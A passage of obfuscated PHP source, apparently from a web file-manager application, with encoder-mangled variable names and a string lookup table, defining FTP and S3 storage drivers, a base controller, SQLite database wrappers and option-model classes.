$æÏòú¬ = $this->iconvSystem($æÏòú¬); $úÖ…º² = $this->iconvSystem($úÖ…º²); $ßµÒ€ŸÊ = ftp_nb_put($this->connect, $æÏòú¬, $úÖ…º², FTP_BINARY); while ($ßµÒ€ŸÊ == FTP_MOREDATA) { $ßµÒ€ŸÊ = ftp_nb_continue($this->connect); } if ($ßµÒ€ŸÊ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } return $this->getPathOuter($æÏòú¬); } public function download($âéÃ½Âæ, $ÂñèÔÒµ = '') { if (!$this->_isconn()) { return !1; } $ŒĞªª‡ = $this->pathFather($ÂñèÔÒµ); if (!IO::mkdir($ŒĞªª‡)) { return !1; } $âéÃ½Âæ = $this->iconvSystem($âéÃ½Âæ); $ÂñèÔÒµ = $this->iconvSystem($ÂñèÔÒµ); $–‰„ËæÁ = ftp_nb_get($this->connect, $ÂñèÔÒµ, $âéÃ½Âæ, FTP_BINARY); while ($–‰„ËæÁ == FTP_MOREDATA) { $–‰„ËæÁ = ftp_nb_continue($this->connect); } if ($–‰„ËæÁ != FTP_FINISHED) { $this->writeLog(__FUNCTION__ . $_SERVER[ïÃ°£«Ê][1660], !0); return !1; } return $this->iconvApp($ÂñèÔÒµ); } public function exist($í´™÷é) { return $this->isFile($í´™÷é) || $this->isFolder($í´™÷é); } public function isFile($®–Ÿğ’…) { return !$this->isFolder($®–Ÿğ’…) && $this->objectMeta($®–Ÿğ’…); } public function isFolder($ô…ª¢­³) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][177], $ô…ª¢­³); } protected function objectMeta($Øš²–) { return $this->cacheMethod($_SERVER[ïÃ°£«Ê][179], $Øš²–); } protected function _objectMeta($÷ØŞİÁå) { $Ò˜©ÓÛÀ =& $_SERVER[ïÃ°£«Ê]; if ($÷ØŞİÁå == $Ò˜©ÓÛÀ[12] || $÷ØŞİÁå == $Ò˜©ÓÛÀ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $÷ØŞİÁå = $this->iconvSystem($÷ØŞİÁå); $ºÓıåŒÜ = array($Ò˜©ÓÛÀ[32] => $this->iconvApp($÷ØŞİÁå), $Ò˜©ÓÛÀ[33] => $Ò˜©ÓÛÀ[230], $Ò˜©ÓÛÀ[79] => 0); $‘§‡ÌÄ– = @ftp_size($this->connect, $÷ØŞİÁå); if ($‘§‡ÌÄ– != -1) { $ºÓıåŒÜ[$Ò˜©ÓÛÀ[79]] = $‘§‡ÌÄ–; } else { $ÑÏŞ‰¾à = @ftp_chdir($this->connect, $÷ØŞİÁå); if (!$ÑÏŞ‰¾à) { return !1; } @ftp_chdir($this->connect, $Ò˜©ÓÛÀ[8]); $ºÓıåŒÜ[$Ò˜©ÓÛÀ[33]] = $Ò˜©ÓÛÀ[78]; } return $ºÓıåŒÜ; } protected function _isFolder($ˆíÎ«ª±) { $ú€äÁ…í =& $_SERVER[ïÃ°£«Ê]; if ($ˆíÎ«ª± == $ú€äÁ…í[12] || $ˆíÎ«ª± == $ú€äÁ…í[8]) { return !0; } $Ší–Î½ï = $this->_objectMeta($ˆíÎ«ª±); return isset($Ší–Î½ï[$ú€äÁ…í[33]]) && $Ší–Î½ï[$ú€äÁ…í[33]] == $ú€äÁ…í[78] ? !0 : !1; } } class PathDriverJOS extends PathDriverBaseS3 { public function __construct($«È’¯ŠÚ) { parent::__construct($«È’¯ŠÚ); $this->setSignVersion($_SERVER[ïÃ°£«Ê][247]); } public function uploadLink($õ¨™˜, $õÀ¼Ø²Û = 0) { $ºîöÀœÕ =& $_SERVER[ïÃ°£«Ê]; if ($this->isUploadServer()) { return; } $äÁ©ñèº = $this->getType(); if (!in_array($äÁ©ñèº, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $š“°ú‰¼ = (!$õÀ¼Ø²Û ? 1 : ceil($õÀ¼Ø²Û / pow(1024, 3))) * 3600 * 4; $ïöäØŸÄ = $this->uploadMultiData($õ¨™˜, $š“°ú‰¼); if ($ïöäØŸÄ) { $ïöäØŸÄ[$ºîöÀœÕ[95]] = $õ¨™˜; $ïöäØŸÄ[$ºîöÀœÕ[96]] = $äÁ©ñèº; } return $ïöäØŸÄ; } public function fileOutImage($ôÙ‡•î¤, $ÊàˆÀãù = 250) { if ($this->size($ôÙ‡•î¤) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ôÙ‡•î¤, $ÊàˆÀãù); } $‹»“¡ªå = $this->link($ôÙ‡•î¤); $‹»“¡ªå .= $_SERVER[ïÃ°£«Ê][1663] . $ÊàˆÀãù; $this->fileOutLink($‹»“¡ªå); } } goto FÉ±„õôêƒ; b¿„×àÅ¿: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($’Ÿ¡¡‰¹) { $öÏÑğ‘½ =& $_SERVER[ïÃ°£«Ê]; parent::__construct($’Ÿ¡¡‰¹); $âĞ”´¡Ğ = isset($’Ÿ¡¡‰¹[$öÏÑğ‘½[256]]) && $’Ÿ¡¡‰¹[$öÏÑğ‘½[256]] == $öÏÑğ‘½[247] ? $öÏÑğ‘½[247] : $öÏÑğ‘½[313]; $this->setSignVersion($âĞ”´¡Ğ); } public function link($Üñ¶Îã¿, $‘Ö…êÑ° = array()) { return parent::link($Üñ¶Îã¿, $‘Ö…êÑ°); } public function fileOut($Ğ‘ˆ»¿É, $Î„ä¡¢ğ = false, $àô…ÒÖ = false, $èğˆ©±ø = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ïÃ°£«Ê][314])) { return parent::fileOutServer($Ğ‘ˆ»¿É, $Î„ä¡¢ğ, $àô…ÒÖ, $èğˆ©±ø); } parent::fileOut($Ğ‘ˆ»¿É, $Î„ä¡¢ğ, $àô…ÒÖ, $èğˆ©±ø); } public function fileOutImage($®Éˆ‘, $‚²†üË = 250) { if (strstr($this->endpoint, $_SERVER[ïÃ°£«Ê][314])) { return parent::fileOutImageServer($®Éˆ‘, $‚²†üË); } parent::fileOutImage($®Éˆ‘, $‚²†üË); } } define($_SERVER[ïÃ°£«Ê][315], 1); define($_SERVER[ïÃ°£«Ê][316], 2); goto C“•¼”Å…; a¢Î¸µ½Ó™: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $¸Õ¶Œ† =& $_SERVER[ïÃ°£«Ê]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$¸Õ¶Œ†[6]] =& $config; $this->values[$¸Õ¶Œ†[7]] =& $in; $this->tpl = TEMPLATE . MOD . $¸Õ¶Œ†[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ù Ïøû) { if (1 === func_num_args()) { $this->{$Ù Ïøû} = new $Ù Ïøû(); } else { $¾öĞ¯ö“ = new ReflectionClass($Ù Ïøû); $˜ûœ“Ë = func_get_args(); array_shift($˜ûœ“Ë); $this->{$Ù Ïøû} = $¾öĞ¯ö“->newInstanceArgs($˜ûœ“Ë); } return $this->{$Ù Ïøû}; } public function routeBind($í×Ğ®ŠŠ, $©È‚ÀõÈ, $ì²ÖÍ’¡ = 3) { $øÃº´° =& $_SERVER[ïÃ°£«Ê]; $´àİô÷† = $this->in[$øÃº´°[9]]; $í×Ğ®ŠŠ = str_replace($øÃº´°[10], $øÃº´°[11], trim(trim($í×Ğ®ŠŠ, $øÃº´°[8]), $øÃº´°[12])); if (!$í×Ğ®ŠŠ || count($´àİô÷†) <= $ì²ÖÍ’¡) { return !1; } $‡­ºåó« = !0; $œ˜Šğ«µ = explode($øÃº´°[8], $í×Ğ®ŠŠ); for ($ŸÉõµî¶ = 0; $ŸÉõµî¶ < count($œ˜Šğ«µ); $ŸÉõµî¶++) { if ($œ˜Šğ«µ[$ŸÉõµî¶] != $´àİô÷†[$ì²ÖÍ’¡ + $ŸÉõµî¶]) { $‡­ºåó« = !1; break; } } if (!$‡­ºåó«) { return; } call_user_func_array(array($this, $©È‚ÀõÈ), array()); } public function routeArgs($óœà©ä = 3) { $™ÔŸş°› = $this->in[$_SERVER[ïÃ°£«Ê][9]]; if (count($™ÔŸş°›) <= $óœà©ä) { return array(); } $üÍäÄÎ = array(); for ($ª€®Š†² = $óœà©ä; $ª€®Š†² < count($™ÔŸş°›); $ª€®Š†² += 2) { $üÍäÄÎ[$™ÔŸş°›[$ª€®Š†²]] = $™ÔŸş°›[$ª€®Š†² + 1]; $this->in[$™ÔŸş°›[$ª€®Š†²]] = $™ÔŸş°›[$ª€®Š†² + 1]; } return $üÍäÄÎ; } protected function assign($Îô¡æêÇ, $öÀàÂÖ”) { $this->values[$Îô¡æêÇ] = $öÀàÂÖ”; } protected function display($Ü†òåŒ…) { ob_end_clean(); extract($this->values); require $this->tpl . $Ü†òåŒ…; } } class DbSqliteBase extends Db { public function __construct($İõı£Ô™ = '') { $á½°à¶ =& $_SERVER[ïÃ°£«Ê]; if (!extension_loaded($á½°à¶[13])) { think_exception(think_lang($á½°à¶[14]) . $á½°à¶[15]); } if (!empty($İõı£Ô™)) { if (!isset($İõı£Ô™[$á½°à¶[16]])) { $İõı£Ô™[$á½°à¶[16]] = 438; } $this->config = $İõı£Ô™; if (empty($this->config[$á½°à¶[17]])) { $this->config[$á½°à¶[17]] = array(); } } } public function connect($Îï°ÔÏ = '', $’ÕáßŠ = 0) { $åò€ò¯ =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->linkID[$’ÕáßŠ])) { if (empty($Îï°ÔÏ)) { $Îï°ÔÏ = $this->config; } $³×ëúüÂ = !empty($Îï°ÔÏ[$åò€ò¯[17]][$åò€ò¯[18]]) ? $Îï°ÔÏ[$åò€ò¯[17]][$åò€ò¯[18]] : $this->pconnect; $Î½Ş´¶† = $³×ëúüÂ ? $åò€ò¯[19] : $åò€ò¯[20]; $this->linkID[$’ÕáßŠ] = $Î½Ş´¶†($Îï°ÔÏ[$åò€ò¯[21]], $Îï°ÔÏ[$åò€ò¯[16]]); if (!$this->linkID[$’ÕáßŠ]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$’ÕáßŠ], 30000); if (1 != think_config($åò€ò¯[22])) { unset($this->config); } } return $this->linkID[$’ÕáßŠ]; } public function free() { $this->queryID = null; } public function query($ûåÓœ) { $ôô«ìŸŠ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ûåÓœ; if ($this->queryID) { $this->free(); } think_action_status($ôô«ìŸŠ[23], 1); think_status($ôô«ìŸŠ[24]); $this->queryID = sqlite_query($this->_linkID, $ûåÓœ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $‘“èªÏğ = $this->getAll(); return $‘“èªÏğ; } } public function execute($öÀºÕæ¡) { $¶™¦‡Öğ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $öÀºÕæ¡; if ($this->queryID) { $this->free(); } think_action_status($¶™¦‡Öğ[25], 1); think_status($¶™¦‡Öğ[24]); $»Úµ½®Ê = sqlite_exec($this->_linkID, $öÀºÕæ¡); $this->debug(); if (!1 === $»Úµ½®Ê) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ïÃ°£«Ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Œ«¬—»¶ = sqlite_query($this->_linkID, $_SERVER[ïÃ°£«Ê][27]); if (!$Œ«¬—»¶) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $×Ëã¨Š“ = sqlite_query($this->_linkID, $_SERVER[ïÃ°£«Ê][28]); if (!$×Ëã¨Š“) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $şªãàúÒ = array(); if ($this->numRows > 0) { for ($öäîË§š = 0; $öäîË§š < $this->numRows; $öäîË§š++) { $şªãàúÒ[$öäîË§š] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $şªãàúÒ; } public function getFields($çÃšŸ™¢) { $ä€½¾£ú =& $_SERVER[ïÃ°£«Ê]; $öØ–¼‡ = $this->query($ä€½¾£ú[29] . $çÃšŸ™¢ . $ä€½¾£ú[30]); $úĞö”Í = array(); if ($öØ–¼‡) { foreach ($öØ–¼‡ as $ß»•«» => $‚ÖÆª¥ş) { $úĞö”Í[$‚ÖÆª¥ş[$ä€½¾£ú[31]]] = array($ä€½¾£ú[32] => $‚ÖÆª¥ş[$ä€½¾£ú[31]], $ä€½¾£ú[33] => $‚ÖÆª¥ş[$ä€½¾£ú[34]], $ä€½¾£ú[35] => (bool) ($‚ÖÆª¥ş[$ä€½¾£ú[36]] === $ä€½¾£ú[12]), $ä€½¾£ú[37] => $‚ÖÆª¥ş[$ä€½¾£ú[38]], $ä€½¾£ú[39] => strtolower($‚ÖÆª¥ş[$ä€½¾£ú[40]]) == $ä€½¾£ú[41], $ä€½¾£ú[42] => strtolower($‚ÖÆª¥ş[$ä€½¾£ú[43]]) == $ä€½¾£ú[44]); } } return $úĞö”Í; } public function getTables($óŒ§ƒÏ¯ = '') { $Şş­·”È =& $_SERVER[ïÃ°£«Ê]; $ºÇ–¨”ê = $this->query($Şş­·”È[45] . $Şş­·”È[46] . $Şş­·”È[47]); $®‚Ù½¡ = array(); foreach ($ºÇ–¨”ê as $ûÌ¬ÚÄ => $ÛÔêüëà) { $®‚Ù½¡[$ûÌ¬ÚÄ] = current($ÛÔêüëà); } return $®‚Ù½¡; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $¸Õê§”ƒ =& $_SERVER[ïÃ°£«Ê]; $×ÛÀÑ½í = sqlite_last_error($this->_linkID); $this->error = $×ÛÀÑ½í . $¸Õê§”ƒ[4] . sqlite_error_string($×ÛÀÑ½í); if ($¸Õê§”ƒ[12] != $this->queryStr) { $this->error .= LNG($¸Õê§”ƒ[48]) . $this->queryStr; } think_trace($this->error, $¸Õê§”ƒ[12], $¸Õê§”ƒ[49]); return $this->error; } public function escapeString($şš×œ±´) { return sqlite_escape_string($şš×œ±´); } public function parseLimit($ªÇÏ—”°) { $¥…á®™ =& $_SERVER[ïÃ°£«Ê]; $¾ºß³¬ = $¥…á®™[12]; if (!empty($ªÇÏ—”°)) { $ªÇÏ—”° = explode($¥…á®™[50], $ªÇÏ—”°); if (count($ªÇÏ—”°) > 1) { $¾ºß³¬ .= $¥…á®™[51] . $ªÇÏ—”°[1] . $¥…á®™[52] . $ªÇÏ—”°[0] . $¥…á®™[53]; } else { $¾ºß³¬ .= $¥…á®™[51] . $ªÇÏ—”°[0] . $¥…á®™[53]; } } return $¾ºß³¬; } } class DbSqlite3Base extends Db { public function __construct($‚ä´ùï = '') { $‡éŠ˜Çµ =& $_SERVER[ïÃ°£«Ê]; if (!class_exists($‡éŠ˜Çµ[54])) { think_exception(think_lang($‡éŠ˜Çµ[14]) . $‡éŠ˜Çµ[55]); } if (!empty($‚ä´ùï)) { if (!isset($‚ä´ùï[$‡éŠ˜Çµ[16]])) { $‚ä´ùï[$‡éŠ˜Çµ[16]] = 438; } $this->config = $‚ä´ùï; if (empty($this->config[$‡éŠ˜Çµ[17]])) { $this->config[$‡éŠ˜Çµ[17]] = array(); } } } public function connect($›î€á£® = '', $°èÅ±å˜ = 0) { $İı•ƒ— =& $_SERVER[ïÃ°£«Ê]; if (!isset($this->linkID[$°èÅ±å˜])) { if (empty($›î€á£®)) { $›î€á£® = $this->config; } $this->linkID[$°èÅ±å˜] = new SQLite3($›î€á£®[$İı•ƒ—[21]]); if (!$this->linkID[$°èÅ±å˜]) { think_exception($this->linkID[$°èÅ±å˜]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$°èÅ±å˜]->busyTimeout(30000); if (1 != think_config($İı•ƒ—[22])) { unset($this->config); } } return $this->linkID[$°èÅ±å˜]; } public function free() { $this->queryID = null; } public function query($Ÿùù¬ö™) { $Â½Öü©í =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ÿùù¬ö™; if ($this->queryID) { $this->free(); } think_action_status($Â½Öü©í[23], 1); think_status($Â½Öü©í[24]); $this->queryID = $this->_linkID->query($Ÿùù¬ö™); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $ÔºíÂ™× = $this->getAll(); $this->numRows = count($ÔºíÂ™×); return $ÔºíÂ™×; } } public function execute($öÛ•œˆ) { $ö¯ ã‰ =& $_SERVER[ïÃ°£«Ê]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $öÛ•œˆ; if ($this->queryID) { $this->free(); } think_action_status($ö¯ ã‰[25], 1); think_status($ö¯ ã‰[24]); $³¢¹Š–§ = $this->_linkID->exec($öÛ•œˆ); $this->debug(); if (!1 === $³¢¹Š–§) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ïÃ°£«Ê][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¡¥…¥Ê = $this->_linkID->query($_SERVER[ïÃ°£«Ê][27]); if (!$¡¥…¥Ê) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $Şé¹ú·¿ = $this->_linkID->query($_SERVER[ïÃ°£«Ê][28]); if (!$Şé¹ú·¿) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $“¸»® = array(); while ($¬ß¹ë„² = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $“¸»®[] = $¬ß¹ë„²; } $this->queryID->reset(); return $“¸»®; } public function getFields($‹¡šÇœÌ) { $Ù¥´ô‚Ã =& $_SERVER[ïÃ°£«Ê]; $Ø‡ğô€„ = $this->query($Ù¥´ô‚Ã[29] . $‹¡šÇœÌ . $Ù¥´ô‚Ã[30]); $œÚœ¡„» = array(); if ($Ø‡ğô€„) { foreach ($Ø‡ğô€„ as $ûŠğ…Ã => $¤áŒ”×ß) { $œÚœ¡„»[$¤áŒ”×ß[$Ù¥´ô‚Ã[32]]] = array($Ù¥´ô‚Ã[32] => $¤áŒ”×ß[$Ù¥´ô‚Ã[32]], $Ù¥´ô‚Ã[33] => $¤áŒ”×ß[$Ù¥´ô‚Ã[33]], $Ù¥´ô‚Ã[35] => (bool) ($¤áŒ”×ß[$Ù¥´ô‚Ã[35]] === $Ù¥´ô‚Ã[12]), $Ù¥´ô‚Ã[37] => $¤áŒ”×ß[$Ù¥´ô‚Ã[56]], $Ù¥´ô‚Ã[39] => (bool) $¤áŒ”×ß[$Ù¥´ô‚Ã[57]], $Ù¥´ô‚Ã[42] => (bool) $¤áŒ”×ß[$Ù¥´ô‚Ã[57]]); } } return $œÚœ¡„»; } public function getTables($ºÄÒÆÏ = '') { $èÍ»€¬ =& $_SERVER[ïÃ°£«Ê]; $³¦‰†¨ó = $this->query($èÍ»€¬[45] . $èÍ»€¬[46] . $èÍ»€¬[47]); $çÈšƒ‹ = array(); foreach ($³¦‰†¨ó as $˜çÍ¨ => $Èè°™éÄ) { $çÈšƒ‹[$˜çÍ¨] = current($Èè°™éÄ); } return $çÈšƒ‹; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $îÈÍÇ‘Á =& $_SERVER[ïÃ°£«Ê]; $this->error = $this->_linkID->lastErrorMsg(); if ($îÈÍÇ‘Á[12] != $this->queryStr) { $this->error .= LNG($îÈÍÇ‘Á[48]) . $this->queryStr; } think_trace($this->error, $îÈÍÇ‘Á[12], $îÈÍÇ‘Á[49]); return $this->error; } public function escapeString($öñ×ùÂÉ) { $…²ş¡üœ =& $_SERVER[ïÃ°£«Ê]; if ($this->_linkID) { return $this->_linkID->escapeString($öñ×ùÂÉ); } return str_ireplace($…²ş¡üœ[58], $…²ş¡üœ[59], $öñ×ùÂÉ); } public function parseLimit($ÇŠêØÄ) { $¤í˜´ï  =& $_SERVER[ïÃ°£«Ê]; $Â¼ãáÚ = $¤í˜´ï [12]; if (!empty($ÇŠêØÄ)) { $ÇŠêØÄ = explode($¤í˜´ï [50], $ÇŠêØÄ); if (count($ÇŠêØÄ) > 1) { $Â¼ãáÚ .= $¤í˜´ï [51] . $ÇŠêØÄ[1] . $¤í˜´ï [52] . $ÇŠêØÄ[0] . $¤í˜´ï [53]; } else { $Â¼ãáÚ .= $¤í˜´ï [51] . $ÇŠêØÄ[0] . $¤í˜´ï [53]; } } return $Â¼ãáÚ; } } goto aƒÃÄ˜†ñê; d§¼’Éé‡È: class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\x74\x65\155\117\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($«à²á¢• = false, $‰¡“ŞÔº = "\155\x6f\x64\x69\x66\171\124\x69\155\145", $˜Ïóéº¥ = false) { $‹Ãš¹º =& $_SERVER[ïÃ°£«Ê]; $ğŞıáÚè = Model($this->modelType)->get(!1, $this->optionType, !0); $‚°úÇÑœ = array_values($ğŞıáÚè); if ($‚°úÇÑœ && $‚°úÇÑœ[0] && !is_array($‚°úÇÑœ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ğŞıáÚè = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ğŞıáÚè) { return $«à²á¢• ? null : array(); } if (!$«à²á¢• && $«à²á¢• !== $‹Ãš¹º[228]) { $ğŞıáÚè = array_filter(array_values($ğŞıáÚè)); return array_sort_by($ğŞıáÚè, $‰¡“ŞÔº, $˜Ïóéº¥, $‹Ãš¹º[487]); } return $ğŞıáÚè[$‹Ãš¹º[488] . $«à²á¢•]; } public function insert($¬úñÚÏ) { $ışÛ¤ =& $_SERVER[ïÃ°£«Ê]; $¬úñÚÏ = array_field_key($¬úñÚÏ, $this->field); $ûùºø‹ = Model($this->modelType)->get($ışÛ¤[489], $this->optionType . $ışÛ¤[490]); $ûùºø‹ = $ûùºø‹ ? $ûùºø‹ : 0; $¬úñÚÏ[$ışÛ¤[487]] = ++$ûùºø‹; $¬úñÚÏ[$ışÛ¤[231]] = time(); $¬úñÚÏ[$ışÛ¤[88]] = time(); Model($this->modelType)->set($ışÛ¤[489], $ûùºø‹, $this->optionType . $ışÛ¤[490]); Model($this->modelType)->set($ışÛ¤[488] . $ûùºø‹, $¬úñÚÏ, $this->optionType); return $ûùºø‹; } public function insertArr($´¼ËÌËÓ) { $ê—¢à‘ =& $_SERVER[ïÃ°£«Ê]; if (!$´¼ËÌËÓ || !is_array($´¼ËÌËÓ)) { return !1; } $¬“ã»îö = Model($this->modelType)->get($ê—¢à‘[489], $this->optionType . $ê—¢à‘[490]); $¬“ã»îö = $¬“ã»îö ? $¬“ã»îö : 0; $ßÊş¨È— = array(); foreach ($´¼ËÌËÓ as $ÍÁª–Ùæ) { $œ£·ƒ€Ï = array_field_key($ÍÁª–Ùæ, $this->field); $œ£·ƒ€Ï[$ê—¢à‘[487]] = ++$¬“ã»îö; $œ£·ƒ€Ï[$ê—¢à‘[231]] = time(); $œ£·ƒ€Ï[$ê—¢à‘[88]] = time(); $ßÊş¨È—[$ê—¢à‘[488] . $¬“ã»îö] = $œ£·ƒ€Ï; } Model($this->modelType)->set($ê—¢à‘[489], $¬“ã»îö, $this->optionType . $ê—¢à‘[490]); Model($this->modelType)->set($ßÊş¨È—, !1, $this->optionType); return $¬“ã»îö; } public function update($Ü’è‰´±, $„Ö‡«ª°) { $ïÛ·‡òÎ =& $_SERVER[ïÃ°£«Ê]; $„Ö‡«ª° = array_field_key($„Ö‡«ª°, $this->field); $‡ç“ï = $this->listData($Ü’è‰´±); if (!$‡ç“ï || !$Ü’è‰´±) { return !1; } $„Ö‡«ª° = array_merge($‡ç“ï, $„Ö‡«ª°); $„Ö‡«ª°[$ïÛ·‡òÎ[88]] = time(); return Model($this->modelType)->set($ïÛ·‡òÎ[488] . $Ü’è‰´±, $„Ö‡«ª°, $this->optionType); } public function remove($êŠßúË“) { if (!$êŠßúË“) { return !1; } return Model($this->modelType)->remove($_SERVER[ïÃ°£«Ê][488] . $êŠßúË“, $this->optionType); } public function removeArr($€¦¼´‡ê) { if (!$€¦¼´‡ê) { return !0; } $Û†®¹Ì = array(); foreach ($€¦¼´‡ê as $¿ÊÅˆ‰¬) { $Û†®¹Ì[] = $_SERVER[ïÃ°£«Ê][488] . $¿ÊÅˆ‰¬; } return Model($this->modelType)->removeArr($Û†®¹Ì, $this->optionType); } public function clear() { $ö»Ğ®¢à =& $_SERVER[ïÃ°£«Ê]; Model($this->modelType)->remove($ö»Ğ®¢à[489], $this->optionType . $ö»Ğ®¢à[490]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($å…ÊÎò, $»—Úı¹) { if (!$»—Úı¹) { return !1; } $²ˆç÷½Ï = $this->listData(); $²ˆç÷½Ï = array_to_keyvalue($²ˆç÷½Ï, $å…ÊÎò); return isset($²ˆç÷½Ï[$»—Úı¹]) ? $²ˆç÷½Ï[$»—Úı¹] : !1; } public function findByName($ßéÕêÚ®) { return $this->findByKey($_SERVER[ïÃ°£«Ê][32], $ßéÕêÚ®); } protected function resetData($òóøÁ‘) { $á‰Íˆƒº =& $_SERVER[ïÃ°£«Ê]; if (!$òóøÁ‘) { return; } $òóøÁ‘ = is_array($òóøÁ‘) ? $òóøÁ‘ : array(); $µëäùÇ = array(); for ($ÊàİÔ­† = 0; $ÊàİÔ­† < count($òóøÁ‘); $ÊàİÔ­†++) { if (!$òóøÁ‘[$ÊàİÔ­†] || !$òóøÁ‘[$ÊàİÔ­†][$á‰Íˆƒº[487]]) { continue; } $µëäùÇ[$á‰Íˆƒº[488] . $òóøÁ‘[$ÊàİÔ­†][$á‰Íˆƒº[487]]] = $òóøÁ‘[$ÊàİÔ­†]; } return Model($this->modelType)->set($µëäùÇ, !1, $this->optionType); } private function getAutoName($½ƒ£ß¹») { $ùúàœÊ = array_to_keyvalue($this->listData(), $_SERVER[ïÃ°£«Ê][32]); if (!$ùúàœÊ || !isset($ùúàœÊ[$½ƒ£ß¹»])) { return $½ƒ£ß¹»; } for ($™ëñÕË = 1; $™ëñÕË < count($ùúàœÊ); $™ëñÕË++) { $­Ó’Ô = $½ƒ£ß¹» . "\x28{$™ëñÕË}\51"; if (!isset($ùúàœÊ[$­Ó’Ô])) { return $­Ó’Ô; } } return $­Ó’Ô; } } class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($é´‘Òä = false, $îüø×Öµ = '', $¼ ü¶ µ = false, $ÑÙ¥ã±› = true) { $÷ï¾®ÎÚ =& $_SERVER[ïÃ°£«Ê]; $ÀàíÒñÛ = $this->cacheGet($îüø×Öµ); $ŞÃŸ±ÛÆ = $this->optionDefault($îüø×Öµ); $ŞÃŸ±ÛÆ = is_array($ŞÃŸ±ÛÆ) ? $ŞÃŸ±ÛÆ : array(); if (is_array($ÀàíÒñÛ)) { if ($ÑÙ¥ã±›) { $ÀàíÒñÛ = array_merge($ŞÃŸ±ÛÆ, $ÀàíÒñÛ); } return $é´‘Òä ? isset($ÀàíÒñÛ[$é´‘Òä]) ? $ÀàíÒñÛ[$é´‘Òä] : null : $ÀàíÒñÛ; } $÷•ÚàÅ­ = $this->filterWhere(array($÷ï¾®ÎÚ[33] => $îüø×Öµ)); $ÀàíÒñÛ = $this->where($÷•ÚàÅ­)->select(); $ÀàíÒñÛ = array_to_keyvalue($ÀàíÒñÛ, $÷ï¾®ÎÚ[95], $÷ï¾®ÎÚ[451]); foreach ($ÀàíÒñÛ as $¢À­€à’ => $éÄØò³¡) { if ($¼ ü¶ µ || in_array($¢À­€à’, $this->jsonField)) { $ÀàíÒñÛ[$¢À­€à’] = json_decode($éÄØò³¡, !0); } } $this->cacheSet($îüø×Öµ, $ÀàíÒñÛ); if ($ÑÙ¥ã±›) { $ÀàíÒñÛ = array_merge($ŞÃŸ±ÛÆ, $ÀàíÒñÛ); } return $é´‘Òä ? $ÀàíÒñÛ[$é´‘Òä] : $ÀàíÒñÛ; } public function set($®›¸îßÌ, $ıûöª†Ø = false, $ë•‡°İ¼ = '') { $ñ¦öĞ©‹ =& $_SERVER[ïÃ°£«Ê]; if (!$®›¸îßÌ) { return !0; } $æÑé°›õ = $this->get(!1, $ë•‡°İ¼, !1, !1); $æÑé°›õ = is_array($æÑé°›õ) ? $æÑé°›õ : array(); $µ–Å‡ëò = array(); $É¹ô¥ç = array(); $½Œ¢¤ê = array(); $–ÕÔ»¿á = is_array($®›¸îßÌ) ? $®›¸îßÌ : array($®›¸îßÌ => $ıûöª†Ø); $ò¾‹È¶¯ = $this->filterWhere(array($ñ¦öĞ©‹[33] => $ë•‡°İ¼)); foreach ($–ÕÔ»¿á as $Ö†Øç© => $Ï‡€ĞÁ²) { if (is_array($Ï‡€ĞÁ²)) { $Ï‡€ĞÁ² = json_encode_force($Ï‡€ĞÁ²); } $this->checkLength($Ï‡€ĞÁ², !1, $this->tableName . $ñ¦öĞ©‹[4] . $®›¸îßÌ); $Ï‡€ĞÁ² = self::textEncode($Ï‡€ĞÁ²); if (array_key_exists($Ö†Øç©, $æÑé°›õ)) { $¥’·şí = is_array($æÑé°›õ[$Ö†Øç©]) ? json_encode_force($æÑé°›õ[$Ö†Øç©]) : 